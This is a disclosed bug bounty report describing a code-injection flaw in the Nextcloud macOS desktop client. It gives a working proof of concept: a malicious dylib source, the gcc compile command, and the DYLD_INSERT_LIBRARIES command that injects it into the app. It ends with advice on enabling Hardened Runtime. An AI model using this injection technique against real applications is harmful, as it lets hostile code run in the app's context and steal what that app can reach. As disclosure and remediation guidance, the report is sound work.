# Code injection in macOS Desktop Client 

## Report Details
- **Report ID**: 633266
- **URL**: https://hackerone.com/reports/633266
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-07-01T17:16:28.195Z
- **Disclosed**: 2020-04-10T09:13:36.619Z

## Reporter
- **Username**: r3ggi-on-h1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Vulnerability description

I've identified a code injection vulnerability in your macOS desktop client. Any malicious application, running with standard user permissions is able to exploit this vulnerability and execute code in your application's context.

## Requirements
In order to exploit this vulnerability, a victim has to have a malicious application installed on the device.

## Proof of Concept
To show you the impact I've prepared a proof of concept where malicious application without root permissions is able to inject to Nextcloud process and open the calculator.

### 1. At first, create a malicious dylib (malicious.m) with following contents:
```objc
#include <Foundation/Foundation.h>

__attribute__((constructor)) static void pwn() {
    
   puts("\n\nHELLO FROM THE DYLIB!\n\n");
    
   NSTask *task = [[NSTask alloc] init];
   task.launchPath = @"/Applications/Calculator.app/Contents/MacOS/Calculator";
   [task launch];
    
}
```

### 2. Compile it using gcc
```bash
gcc -dynamiclib -undefined suppress -flat_namespace malicious.m -o malicious.dylib -compatibility_version 10.10.10 -lobjc -framework Foundation
```

### 3. Inject the library using DYLD environment variable. (This is the easiest way to reproduce the vulnerability)
```bash
DYLD_FORCE_FLAT_NAMESPACE=1 DYLD_INSERT_LIBRARIES=./malicious.dylib /Applications/nextcloud.app/Contents/MacOS/nextcloud
```

### 4. Calculator should be opened as shown on attached screenshot


## Recommendations
Assuming that the desktop client has been compiled using XCode, a developer needs to turn on "Hardened Runtime" capability making sure that *Allow DYLD Environment Variables* option is **turned off**. Another way to disallow the DYLD Environement variables is adding a *_RESTRICTED* segment to the application binary.

## References
Privilege escalation in Keybase using this technique
https://hackerone.com/reports/470003

Apple Docs - Hardened runtime entitlements
https://developer.apple.com/documentation/security/hardened_runtime_entitlements

## Important notes
* Physical access is **not** required to exploit this vulnerability.
* Applications do **not** need root permission to open other applications with *DYLD_INSERT_LIBRARIES* enviornment variable -  [execve documentation](https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/execve.2.html).

## Impact

Code execution in the application's context. Any sensitive resource that may be accessed via the application may be stolen. Attacker is also able to perform any action that user may perform from the app.

## Attachments
- nextcloud.png
